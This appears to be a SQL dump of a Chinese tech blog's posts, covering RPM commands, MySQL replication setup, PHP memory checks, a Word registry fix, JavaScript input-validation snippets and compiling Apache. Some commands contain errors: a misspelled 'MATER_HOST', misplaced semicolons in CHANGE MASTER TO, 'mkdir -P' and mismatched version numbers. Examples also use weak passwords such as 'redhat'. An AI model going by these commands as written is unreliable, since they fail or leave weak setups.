options</p>\r\n\r\n<p>参数：</p>\r\n\r\n<p>pkg1...pkgN将要校验的软件包名</p>\r\n\r\n<p>软件包选项：</p>\r\n\r\n<p>-p PACKAGE_FILE校验PACKAGE_FILE所属的软件包；-a校验所有的软件包；-g group校验所有属于组group的软件包。</p>\r\n\r\n<p>详细选项：</p>\r\n\r\n<p>--noscripts不运行校验脚本；--nodeps不校验依赖性；--nofiles不校验文档属性。</p>\r\n\r\n<p>通用选项：</p>\r\n\r\n<p>-v 显示附加信息；-vv显示调试信息；--root&nbsp; PATH让RPM将PATH指定的路径做为根目录，这样预安装程序和后安装程序都会安装到这个目录下；--rcfile&nbsp; FILELIST设置rpmrc文件为FILELIST；--dbpath DIRECTORY设置RPM资料库所在的路径为DIRECTORY。</p>\r\n\r\n<p>6．校验软件包中的文件</p>\r\n\r\n<p>语法：</p>\r\n\r\n<p>rpm -K(or--checksig) options file1.rpm...fileN.rpm</p>\r\n\r\n<p>参数：</p>\r\n\r\n<p>file1.rpm...fileN.rpm软件包的文件名；Checksig--详细选项；--nopgp不校验PGP签名。</p>\r\n\r\n<p>通用选项：</p>\r\n\r\n<p>-v显示附加信息；-vv显示调试信息；--rcfile FILELIST设置rpmrc文件为FILELIST。</p>\r\n\r\n<p>7．其他RPM选项</p>\r\n\r\n<p>--rebuilddb重建RPM资料库；--initdb创建一个新的RPM资料库；--quiet尽可能地减少输出；--help显示帮助文件；--version显示RPM的当前版本。</p>\r\n\r\n<p>如 果你不喜欢在字符接口下安装或卸载这些软件包，完全可以安装基于X-Window的图形接口软件包管理程序，如glint,&nbsp; xrpm这样的图形接口。或使用KDE的KPackage（单击【开始】&rarr;【运行命令】，在其中输入KPackage即可启动KPackage）等，这样 对软件包的安装、升级、卸载、验证和查询就可以通过单击鼠标来轻松完成，如图所示。</p>\r\n\r\n<p>需要注意的是，每个RPM软件包格式的软件并不一定是独立的，各个RPM软件包之间有一定的依赖关系，删除某个RPM软件包可能导致别的软件不能使用。因此在升级和删除时应该注意。</p>\r\n',0,1437296210,0,0),(33,27,'Zend Framework下载地址','<p>Zend Framework 是用于 PHP 开发 Web 应用程序和 Web Service 程序的高品质开源框架。利用 PHP 自身特性，Zend Framework 有很高的易用性和强大的功能。它提供了先进、健壮和安全的开发网站的解决方案。</p>\r\n\r\n<p>Zend Framework 1.9.6 下载地址:</p>\r\n\r\n<p>Zend Framework 1.9.6 Full (全功能版本):<br />\r\nZIP格式下载：http://framework.zend.com/releases/ZendFramework-1.9.6/ZendFramework-1.9.6.zip<br />\r\ntar.gz格式下载：http://framework.zend.com/releases/ZendFramework-1.9.6/ZendFramework-1.9.6.tar.gz</p>\r\n\r\n<p>Zend Framework 1.9.6 Minimal(迷你版):</p>\r\n\r\n<p>ZIP格式下载：http://framework.zend.com/releases/ZendFramework-1.9.6/ZendFramework-1.9.6-minimal.zip</p>\r\n\r\n<p>tar.gz格式下载：http://framework.zend.com/releases/ZendFramework-1.9.6/ZendFramework-1.9.6-minimal.tar.gz</p>\r\n',0,1437296339,0,0),(34,25,'MySQL主主复制配置','<p>首先要在两天主机上配置好MySQL，步骤与上文主从复制的一样，因此这里不再给出。这里使用的MySQL是编译安装的mysql-5.5.20版本的MySQL。</p>\r\n\r\n<p>MySQL主主服务器架构与主从服务器架构不同：主主架构的两台服务器，即为主服务器又为另一台服务器的从服务器。任何一台服务器的数据库发生变化，都会同步到另外一台服务器上，即两台服务器互为主从。</p>\r\n\r\n<p>配置需要服务器两台，并且都要配置好MySQL：</p>\r\n\r\n<p>server1_mysql:172.16.29.3<br />\r\nserver2_mysql:172.16.29.4</p>\r\n\r\n<p>1、在两台服务器上各自建立一个具有复制权限的用户：</p>\r\n\r\n<p>server1：</p>\r\n\r\n<p>mysql&gt; grant replication client, replication slave on *.* to server1@&#39;172.16.%.%&#39; identified by &#39;redhat&#39;;</p>\r\n\r\n<p>mysql&gt; flush privileges;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 重新载入授权表，使创建的用户生效</p>\r\n\r\n<p>mysql&gt; show grants for server1@&#39;172.16.%.%&#39;;</p>\r\n\r\n<p>server2：</p>\r\n\r\n<p>mysql&gt; grant replication client, replication slave on *.* to server2@&#39;172.16.%.%&#39; identified by &#39;redhat&#39;;</p>\r\n\r\n<p>mysql&gt; flush privileges;&nbsp; &nbsp;</p>\r\n\r\n<p>mysql&gt; show grants for server2@&#39;172.16.%.%&#39;;</p>\r\n\r\n<p>2、修改MySQL的配置文件：</p>\r\n\r\n<p># vim /etc/my.cnf</p>\r\n\r\n<p>server1:</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>server-id = 10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>log-bin = mysql-bin</p>\r\n\r\n<p>relay-log = relay-bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 开启中继日志功能</p>\r\n\r\n<p>relay-log-index = relay-bin.index</p>\r\n\r\n<p>auto-increment-increment = 2 每次增长2</p>\r\n\r\n<p>auto-increment-offset = 1&nbsp;&nbsp;&nbsp; 设置自动增长的字段的偏移量，即初始值为2</p>\r\n\r\n<p>innodb_file_per_table = 1</p>\r\n\r\n<p>server2:</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>server-id = 20</p>\r\n\r\n<p>log-bin = mysql-bin&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>relay-log = relay-bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 开启中继日志功能</p>\r\n\r\n<p>relay-log-index = relay-bin.index</p>\r\n\r\n<p>auto-increment-increment = 2 每次增长2</p>\r\n\r\n<p>auto-increment-offset = 2&nbsp;&nbsp;&nbsp; 设子自动增长的字段的偏移量，即初始值为2</p>\r\n\r\n<p>innodb_file_per_table = 1</p>\r\n\r\n<p>注：二都只有server-id不同和 auto-increment- offset不同<br />\r\nauto-increment-increment的值应设为整个结构中服务器的总数，本案例用到两台服务器，所以值设为2。</p>\r\n\r\n<p>在这里我们还可以做数据库过滤，用法有：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; replicate_do_db = 数据库名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 复制某个数据库&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; replicate_ignore_db = 数据库名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 忽略某个数据库<br />\r\n&nbsp;&nbsp;&nbsp; replicate_do_table = 数据库名.表名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 复制某个数据库的某表<br />\r\n&nbsp;&nbsp;&nbsp; replicate_ignore_table = 数据库名.表名&nbsp; 忽略某个数据库的某表</p>\r\n\r\n<p>不仅如此，我们还可以使用基于通配符的方式过滤：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; replicate_wild_do_table = 数据库名.表名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 复制某个数据库中的某表（只不过这里可以使用通配符）<br />\r\n&nbsp;&nbsp;&nbsp; replicate_wild_ignore_table =&nbsp; 数据库名.表名</p>\r\n\r\n<p>比如：在从服务器上只复制nsm一个数据库，就可以写入：</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>replicate_do_db=nsm</p>\r\n\r\n<p>若想复制多个数据库，只需后面多跟几个语句即可：</p>\r\n\r\n<p>replicate_do_db=数据库名</p>\r\n\r\n<p>注：若做数据库过滤，尽量不要在主服务器上做过滤，否则，不仅会浪费额外的网络带宽，还会造成二进制日志文件的丢失</p>\r\n\r\n<p>重启两台MySQL服务器：</p>\r\n\r\n<p># service mysqld restart</p>\r\n\r\n<p>3、如果此时两台服务器均为新建立，且无其它写入操作，各服务器只需记录当前自己二进制日志文件及事件位置，以之作为另外的服务器复制起始位置即可</p>\r\n\r\n<p>server1：</p>\r\n\r\n<p>mysql&gt; show master status\\G</p>\r\n\r\n<p>*************************** 1. row ***************************</p>\r\n\r\n<p>File: mysql-bin.000004</p>\r\n\r\n<p>Position: 107</p>\r\n\r\n<p>Binlog_Do_DB: &nbsp;</p>\r\n\r\n<p>Binlog_Ignore_DB: &nbsp;</p>\r\n\r\n<p>1 row in set (0.00 sec)</p>\r\n\r\n<p>server2：</p>\r\n\r\n<p>mysql&gt; show master status\\G</p>\r\n\r\n<p>*************************** 1. row ***************************</p>\r\n\r\n<p>File: mysql-bin.000003</p>\r\n\r\n<p>Position: 107</p>\r\n\r\n<p>Binlog_Do_DB: &nbsp;</p>\r\n\r\n<p>Binlog_Ignore_DB: &nbsp;</p>\r\n\r\n<p>1 row in set (0.00 sec)</p>\r\n\r\n<p>4、接下来需要为服务器各自指定另一台服务器作为自己的主服务器，实现主主复制功能：</p>\r\n\r\n<p>server1：</p>\r\n\r\n<p>mysql&gt; CHANGE MASTER TO &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MATER_HOST=&#39;172.16.29.4&#39;, &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_USER=&#39;server2&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; master_password=&#39;redhat&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_LOG_FILE=&#39;mysql-bin.000003&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_LOG_POS=107;</p>\r\n\r\n<p>而后，开启从服务器：</p>\r\n\r\n<p>mysql&gt; start slave;</p>\r\n\r\n<p>查看从服务器状态，下面两项开启即可：</p>\r\n\r\n<p>mysql&gt; show slave status\\G&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Slave_IO_Running: Yes</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Slave_SQL_Running: Yes</p>\r\n\r\n<p>server2：</p>\r\n\r\n<p>mysql&gt; CHANGE MASTER TO &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_HOST=&#39;172.16.29.3&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_USER=&#39;server1&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; master_password=&#39;redhat&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_LOG_FILE=&#39;mysql-bin.000004&#39;,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; MASTER_LOG_POS=107;</p>\r\n\r\n<p>开启从服务器：</p>\r\n\r\n<p>mysql&gt; start slave;</p>\r\n\r\n<p>查看从服务器状态，下面两项开启即可：</p>\r\n\r\n<p>mysql&gt; show slave status\\G&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Slave_IO_Running: Yes</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Slave_SQL_Running: Yes</p>\r\n',0,1437298302,0,0),(35,25,'MySQL主从复制配置','<p>Mysql的主从复制至少是需要两个Mysql的服务，当然Mysql的服务是可以分布在不同的服务器上，也可以在一台服务器上启动多个服务。</p>\r\n\r\n<p>(1)首先确保主从服务器上的Mysql版本相同</p>\r\n\r\n<p>(2)在主服务器上,设置一个从数据库的账户,使用REPLICATION SLAVE赋予权限,如:</p>\r\n\r\n<p>mysql&gt; GRANT REPLICATION SLAVE ON *.* TO &#39;slave001&#39;@&#39;192.168.0.99&#39; IDENTIFIED BY &#39;123456&#39;;</p>\r\n\r\n<p>Query OK, 0 rows affected (0.13 sec)</p>\r\n\r\n<p>(3)修改主数据库的配置文件my.cnf,开启BINLOG，并设置server-id的值，修改之后必须重启Mysql服务</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>log-bin = /home/mysql/log/mysql-bin.log</p>\r\n\r\n<p>server-id=1</p>\r\n\r\n<p>(4)之后可以得到主服务器当前二进制日志名和偏移量，这个操作的目的是为了在从数据库启动后，从这个点开始进行数据的恢复</p>\r\n\r\n<p>mysql&gt; show master status\\G;</p>\r\n\r\n<p>*************************** 1. row ***************************</p>\r\n\r\n<p>File: mysql-bin.000003</p>\r\n\r\n<p>Position: 243</p>\r\n\r\n<p>Binlog_Do_DB:</p>\r\n\r\n<p>Binlog_Ignore_DB:</p>\r\n\r\n<p>1 row in set (0.00 sec)</p>\r\n\r\n<p>(5)好了，现在可以停止主数据的的更新操作，并生成主数据库的备份，我们可以通过mysqldump到处数据到从数据库，当然了，你也可以直接用cp命令将数据文件复制到从数据库去</p>\r\n\r\n<p>注意在导出数据之前先对主数据库进行READ LOCK，以保证数据的一致性</p>\r\n\r\n<p>mysql&gt; flush tables with read lock;</p>\r\n\r\n<p>Query OK, 0 rows affected (0.19 sec)</p>\r\n\r\n<p>之后是mysqldump</p>\r\n\r\n<p>mysqldump -h127.0.0.1 -p3306 -uroot -p test &gt; /home/chenyz/test.sql</p>\r\n\r\n<p>最好在主数据库备份完毕，恢复写操作</p>\r\n\r\n<p>mysql&gt; unlock tables;</p>\r\n\r\n<p>Query OK, 0 rows affected (0.28 sec)</p>\r\n\r\n<p>(6)将刚才主数据备份的test.sql复制到从数据库，进行导入</p>\r\n\r\n<p>(7)接着修改从数据库的my.cnf,增加server-id参数,指定复制使用的用户,主数据库服务器的ip,端口以及开始执行复制日志的文件和位置</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>server-id=2</p>\r\n\r\n<p>log_bin = /var/log/mysql/mysql-bin.log</p>\r\n\r\n<p>master-host =192.168.1.100</p>\r\n\r\n<p>master-user=test</p>\r\n\r\n<p>master-pass=123456</p>\r\n\r\n<p>master-port =3306</p>\r\n\r\n<p>master-connect-retry=60</p>\r\n\r\n<p>replicate-do-db =test</p>\r\n\r\n<p>(8)在从服务器上,启动slave进程</p>\r\n\r\n<p>mysql&gt; start slave;</p>\r\n\r\n<p>(9)在从服务器进行show salve status验证</p>\r\n\r\n<p>mysql&gt; SHOW SLAVE STATUS\\G</p>\r\n\r\n<p>*************************** 1. row ***************************</p>\r\n\r\n<p>Slave_IO_State: Waiting for master to send event</p>\r\n\r\n<p>Master_Host: localhost</p>\r\n\r\n<p>Master_User: root</p>\r\n\r\n<p>Master_Port: 3306</p>\r\n\r\n<p>Connect_Retry: 3</p>\r\n\r\n<p>Master_Log_File: mysql-bin.003</p>\r\n\r\n<p>Read_Master_Log_Pos: 79</p>\r\n\r\n<p>Relay_Log_File: gbichot-relay-bin.003</p>\r\n\r\n<p>Relay_Log_Pos: 548</p>\r\n\r\n<p>Relay_Master_Log_File: mysql-bin .003</p>\r\n\r\n<p>Slave_IO_Running: Yes</p>\r\n\r\n<p>Slave_SQL_Running: Yes</p>\r\n\r\n<p>(10)好了,现在可以在我们的主服务器做一些更新的操作,然后在从服务器查看是否已经更新</p>\r\n',0,1437298403,0,0),(36,10,'php查看内存使用','<p>下面是PHP memory_get_usage()使用示例：<br />\r\necho memory_get_usage(), &#39;&lt;br /&gt;&#39;; // 313864 &nbsp;<br />\r\n$tmp = str_repeat(&#39;http://blog.huachen.me/&#39;, 4000); &nbsp;<br />\r\necho memory_get_usage(), &#39;&lt;br /&gt;&#39;; // 406048 &nbsp;<br />\r\nunset($tmp); &nbsp;<br />\r\necho memory_get_usage(); // 313952</p>\r\n\r\n<p>上面的程序后面的注释代表了它们的输出（单位为 byte(s)），也就是当时 PHP 脚本使用的内存（不含 memory_get_usage() 函数本身占用的内存）</p>\r\n\r\n<p>由上面的例子可以看出，要想减少内存的占用，可以使用 PHP unset() 函数把不再需要使用的变量删除。类似的还有：PHP mysql_free_result() 函数，可以清空不再需要的查询数据库得到的结果集，这样也能得到更多可用内存。</p>\r\n\r\n<p>PHP memory_get_usage()还可以有个参数，$real_usage，其值为布尔值。默认为 FALSE，表示得到的内存使用量不包括该函数（PHP 内存管理器）占用的内存；当设置为 TRUE 时，得到的内存为不包括该函数（PHP 内存管理器）占用的内存。</p>\r\n\r\n<p>所以在实际编程中，可以用PHP memory_get_usage()比较各个方法占用内存的高低，来选择使用哪种占用内存小的方法。</p>\r\n\r\n<p>常用的检测：<br />\r\n用microtime函数就可以分析程序执行时间<br />\r\nmemory_get_usage可以分析内存占用空间<br />\r\nSQL的效率可以使用打开慢查询查看日志分析<br />\r\nSQL 找到有瓶颈的使用EXPLAIN 来分析</p>\r\n',0,1437298516,0,0),(37,28,'win7系统中word2007每次打开都出现正在配置的对话框','<p>win7系统中word2007每次打开都出现正在配置的对话框</p>\r\n\r\n<p>解决方法：</p>\r\n\r\n<p>1. 通过重装Office以后解决此问题（太笨）</p>\r\n\r\n<p>2. 注册<br />\r\n如若是Office 2003的对应问题，在运行对话框中输入：<br />\r\nreg add HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Options /v NoReReg /t REG_DWORD /d 1<br />\r\n回车即可。</p>\r\n\r\n<p>若是Office 2007的对应问题，在运行对话框中输入：<br />\r\nreg add HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Options /v NoReReg /t REG_DWORD /d 1</p>\r\n\r\n<p>若是Office 2007的对应问题，在运行对话框中输入：<br />\r\nreg add HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Options /v NoReReg /t REG_DWORD /d 1<br />\r\n回车即可。</p>\r\n\r\n<p>3. 改文件，也最简单<br />\r\n打开&ldquo;我的电脑C：\\Program Files\\Common Files\\Microsoft Shared\\OFFICE12\\Office Setup Controller&mdash;&mdash;找到一个&ldquo;SETUP.EXE&rdquo;的文件，对此文件重命名。</p>\r\n',0,1437298775,0,0),(38,1,'JS-只能输入中文和英文','<p>JS-只能输入中文和英文<br />\r\n在js中用正则表达式对象(RegExp)判断</p>\r\n\r\n<p>中文 ^[\\u0391-\\uFFE5]+$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 英文 ^[A-Za-z]+$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 中文和英文/^[\\u0391-\\uFFE5A-Za-z]+$/</p>\r\n\r\n<p>js正则表达式限制文本框只能输入数字,小数点,英文字母,汉字等各类代码</p>\r\n\r\n<p>1.文本框只能输入数字代码(小数点也不能输入)<br />\r\n&lt;input onkeyup=&quot;this.value=this.value.replace(/\\D/g,&#39;&#39;)&quot; onafterpaste=&quot;this.value=this.value.replace(/\\D/g,&#39;&#39;)&quot;&gt;</p>\r\n\r\n<p>2.只能输入数字,能输小数点.<br />\r\n&lt;input onkeyup=&quot;if(isNaN(value))execCommand(&#39;undo&#39;)&quot; onafterpaste=&quot;if(isNaN(value))execCommand(&#39;undo&#39;)&quot;&gt;<br />\r\n&lt;input name=txt1 onchange=&quot;if(/\\D/.test(this.value)){alert(&#39;只能输入数字&#39;);this.value=&#39;&#39;;}&quot;&gt;</p>\r\n\r\n<p>3.数字和小数点方法二<br />\r\n&lt;input type=text tvalue=&quot;&quot; ovalue=&quot;&quot; onkeypress=&quot;if(!this.value.match(/^[\\+\\-]?\\d*?\\.?\\d*?$/))this.value=this.t_value;else this.tvalue=this.value;if(this.value.match(/^(?:[\\+\\-]?\\d+(?:\\.\\d+)?)?$/))this.ovalue=this.value&quot; onkeyup=&quot;if(!this.value.match(/^[\\+\\-]?\\d*?\\.?\\d*?$/))this.value=this.t_value;else this.tvalue=this.value;if(this.value.match(/^(?:[\\+\\-]?\\d+(?:\\.\\d+)?)?$/))this.ovalue=this.value&quot; onblur=&quot;if(!this.value.match(/^(?:[\\+\\-]?\\d+(?:\\.\\d+)?|\\.\\d*?)?$/))this.value=this.o_value;else{if(this.value.match(/^\\.\\d+$/))this.value=0+this.value;if(this.value.match(/^\\.$/))this.value=0;this.ovalue=this.value}&quot;&gt;</p>\r\n\r\n<p>4.只能输入字母和汉字<br />\r\n&lt;input onkeyup=&quot;value=value.replace(/[\\d]/g,&#39;&#39;) &quot;onbeforepaste=&quot;clipboardData.setData(&#39;text&#39;,clipboardData.getData(&#39;text&#39;).replace(/[\\d]/g,&#39;&#39;))&quot; maxlength=10 name=&quot;Numbers&quot;&gt;</p>\r\n\r\n<p>5.只能输入英文字母和数字,不能输入中文<br />\r\n&lt;input onkeyup=&quot;value=value.replace(/[^\\w\\.\\/]/ig,&#39;&#39;)&quot;&gt;</p>\r\n\r\n<p>6.只能输入数字和英文&lt;font color=&quot;Red&quot;&gt;chun&lt;/font&gt;<br />\r\n&lt;input onKeyUp=&quot;value=value.replace(/[^\\d|chun]/g,&#39;&#39;)&quot;&gt;</p>\r\n\r\n<p>7.小数点后只能有最多两位(数字,中文都可输入),不能输入字母和运算符号:<br />\r\n&lt;input onKeyPress=&quot;if((event.keyCode&lt;48 || event.keyCode&gt;57) &amp;&amp; event.keyCode!=46 || /\\.\\d\\d$/.test(value))event.returnValue=false&quot;&gt;</p>\r\n\r\n<p>8.小数点后只能有最多两位(数字,字母,中文都可输入),可以输入运算符号:<br />\r\n&lt;input onkeyup=&quot;this.value=this.value.replace(/^(\\-)*(\\d+)\\.(\\d\\d).*$/,&#39;$1$2.$3&#39;)&quot;&gt;</p>\r\n\r\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>\r\n\r\n<p>只能输入汉字：<br />\r\n&lt;input onkeyup=&quot;value=value.replace(/[^\\u4E00-\\u9FA5]/g,&#39;&#39;)&quot; onbeforepaste=&quot;clipboardData.setData(&#39;text&#39;,clipboardData.getData(&#39;text&#39;).replace(/[^\\u4E00-\\u9FA5]/g,&#39;&#39;))&quot;&gt;</p>\r\n\r\n<p>只能输入数字：<br />\r\n&lt;input onkeyup=&quot;value=value.replace(/[^\\d]/g,&#39;&#39;) &quot;onbeforepaste=&quot;clipboardData.setData(&#39;text&#39;,clipboardData.getData(&#39;text&#39;).replace(/[^\\d]/g,&#39;&#39;))&quot;&gt;</p>\r\n\r\n<p><br />\r\n只能输入英文和数字：<br />\r\n&lt;input onkeyup=&quot;value=value.replace(/[\\W]/g,&#39;&#39;) &quot;onbeforepaste=&quot;clipboardData.setData(&#39;text&#39;,clipboardData.getData(&#39;text&#39;).replace(/[^\\d]/g,&#39;&#39;))&quot;&gt;</p>\r\n\r\n<p>控制输入框只能输入文字或数字，也可以不允许输入特殊字符<br />\r\n这里不允许输入如下字符: (像 !@#$%^&amp;* 等)&lt;br&gt;<br />\r\n&lt;textarea rows=2 cols=20 name=comments onKeypress=&quot;if ((event.keyCode &gt; 32 &amp;&amp; event.keyCode &lt; 48) || (event.keyCode &gt; 57 &amp;&amp; event.keyCode &lt; 65) || (event.keyCode &gt; 90 &amp;&amp; event.keyCode &lt; 97)) event.returnValue = false;&quot;&gt;</p>\r\n\r\n<p>只禁止空格输入<br />\r\nonkeyup=&quot;value=value.replace(/\\s/g,&#39;&#39;)&quot;</p>\r\n\r\n<p>只能输入中文和英文：<br />\r\nonkeyup=&quot;value=value.replace(/[^\\a-zA-Z\\u4E00-\\u9FA5]/g,&#39;&#39;)&quot; onbeforepaste=&quot;clipboardData.setData(&#39;text&#39;,clipboardData.getData(&#39;text&#39;).replace(/[^\\a-zA-Z\\u4E00-\\u9FA5]/g,&#39;&#39;))&quot;</p>\r\n',0,1437298946,0,0),(39,15,'Linux apache编译安装','<p>1.下载httpd-2.2.15.tar.gz</p>\r\n\r\n<p>wget&nbsp; http://mirror.bjtu.edu.cn/apache/httpd/httpd-2.2.17.tar.gz</p>\r\n\r\n<p>[root@test-AS4 ~]# mkdir -P /usr/local/src/apache/&nbsp;&nbsp;&nbsp; #创建源包存放的目录</p>\r\n\r\n<p>[root@test-AS4 ~]# cd /usr/local/src/apache/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #把httpd-2.2.15.tar.gz放入此目录下</p>\r\n\r\n<p>[root@test-AS4 apache]# tar zxvf httpd-2.2.15.tar.gz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #解压文件会生成httpd-2.2.15目录</p>\r\n\r\n<p>[root@test-AS4 apache]# ll<br />\r\ntotal 6464<br />\r\ndrwxr-xr-x&nbsp; 11 angel angel&nbsp;&nbsp;&nbsp; 4096 Mar 10 07:42 httpd-2.2.15<br />\r\n-rw-r--r--&nbsp;&nbsp; 1 root&nbsp; root&nbsp; 6593633 Mar 10&nbsp; 2010 httpd-2.2.15.tar.gz</p>\r\n\r\n<p>[root@test-AS4 httpd-2.2.15]# cd httpd-2.2.15<br />\r\n&nbsp;</p>\r\n\r\n<p>[root@test-AS4 httpd-2.2.15]# ./configure --prefix=/usr/local/apache-2.2.15&nbsp; --enable-so --enable-mods-shared=most --with-mpm=worker</p>\r\n\r\n<p>如果发现gcc没有装，请先安装GCC&nbsp; yum -y install gcc</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>[root@test-AS4 httpd-2.2.15]# make&nbsp;&nbsp; #执行make前执行&nbsp;&nbsp; apt-get build-dep fcitx</p>\r\n\r\n<p>[root@test-AS4 httpd-2.2.15]# make install</p>\r\n\r\n<p>#&nbsp; --prefix=&lt;Install_Path&gt; 指明编译后的二进制文件安装到&lt;Install_Path&gt;目录，用实际安装路径替换&lt;Install_Path&gt;，如 --prefix=/usr/local/apache-2.2.15 ，如果省略此配置参数，默认安装到/usr/local/apache2目录。</p>\r\n\r\n<p>#&nbsp; --enable-so 指明编译动态加载模块(DSO)支持到httpd二进制文件，此模块使得Apache的各功能模块可以与核心分开编译、运行时动态加载。有了DSO支持， 升级和增加模块时只需编译相关的模块即可，不必重新编译整个系统。最新版本的Apache缺省编译此模块到httpd二进制文件，如果你在使用早期版本的 apache并且需要DSO支持，可能要明确指出此选项。</p>\r\n\r\n<p>#&nbsp; --enable-mods-shared=&lt;MODULE-LIST&gt; 明确指明要以DSO方式编译的模块，&lt;MODULE-LIST&gt;为空格分隔的模块名列表、all或者most，all表示包含所有模 块，most表示包含大部分模块，如--enable-mods-share=&quot;rewrite deflate&quot;，--enable-mods-share=most，效果等同于多个--enable-&lt;FEATURE&gt;=share<br />\r\n# --with-mpm=&lt;MPM&gt; 先择Apache多路处理模块，&lt;MPM&gt;={beos|event|worker|prefork|mpmt_os2}，prefork为 Unix系统下默认处理模块，它将运行一个非线程型的、预派生的Web服务器，适合于没有线程安全库，需要避免线程兼容性问题的系统，它是要求将每个请求 相互独立的情况下最好的MPM，这样若一个请求出现问题就不会影响到其他请求。worker为支持混合的多线程多进程的多路处理模块，由于使用线程来处理 请求，所以可以处理海量请求，而系统资源的开销小于基于进程的MPM，同时，它也使用了多进程，每个进程又有多个线程，以获得基于进程的MPM的稳定性。 如果你的系统是基于线程安全的，那么笔者建议使用worker替代prefork，它将使得你的系统得到实际的性能改善。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2. 设置开机自启动服务控制脚本<br />\r\nApache安装后可通过其安装路径的bin目录下的apachectl脚本控制服务的启动和停止。本例中apache安装在/usr/local/apache-2.2.15，服务控制脚本为：<br />\r\n/usr/local/apache-2.2.15/bin/apachectl<br />\r\n&nbsp;&nbsp; 执行下面的命令启动Apache服务：<br />\r\n/usr/local/apache-2.2.15/bin/apachectl start<br />\r\n&nbsp;&nbsp; 执行下面的命令停止Apache服务：<br />\r\n/usr/local/apache-2.2.15/bin/apachectl stop<br />\r\n可以简单地把Apache启动命令加到/etc/rc.local文件，让Apache随系统启动而自动启动：<br />\r\necho &quot;/usr/local/apache-2.2.15/bin/apachectl start&quot;&nbsp; &gt;&gt; /etc/rc.local</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>下面介绍如何把Apache加入到系统服务，用service命令来控制Apache的启动和停止。</p>\r\n\r\n<p>## 这里请注意一下！如果Linux服务器上默认安装了httpd的话(用rpm -qa|grep httpd查看)，</p>\r\n\r\n<p>## 会有 /etc/init.d/httpd 这个脚本文件的，所以你也可以用以下方法直接生成这个文件来覆盖它</p>\r\n\r\n<p>## 那么下次就可以用 service httpd start 来启动了</p>\r\n\r\n<p>## 如果需要区分开来的话就使用下面的方式<br />\r\n首先以apachectl脚本为模板生成Apache服务控制脚本：<br />\r\ngrep -v &quot;#&quot; /usr/local/apache-2.2.15/bin/apachectl&nbsp; &gt; /etc/init.d/apache<br />\r\n&nbsp;&nbsp; 用vi编辑Apache服务控制脚本/etc/init.d/apache：<br />\r\nvi /etc/init.d/apache<br />\r\n&nbsp;&nbsp; 在文件最前面插入下面的行，使其支持chkconfig命令：<br />\r\n#!/bin/sh<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # chkconfig: 2345 85 15<br 